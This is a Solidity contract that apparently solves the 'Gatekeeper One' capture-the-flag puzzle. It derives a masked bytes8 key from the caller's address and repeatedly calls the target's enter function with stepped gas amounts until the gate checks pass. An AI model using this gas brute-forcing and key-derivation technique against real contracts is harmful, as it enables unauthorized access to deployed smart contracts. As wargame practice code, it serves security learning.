// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

contract GatekeeperOneChallenge {
    address public gatekeeper;

    constructor(address _gatekeeper) {
        gatekeeper = _gatekeeper;
    }

    function attack(uint256 rounds) external {
        bytes8 gateKey = bytes8(uint64(uint160(msg.sender))) &
            0xFFFFFFFF0000FFFF;

        for (uint256 i; i < rounds; i++) {
            (bool success, bytes memory data) = gatekeeper.call{
                gas: 8191 * 10 + i
            }(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success) {
                break;
            }
        }
    }
}
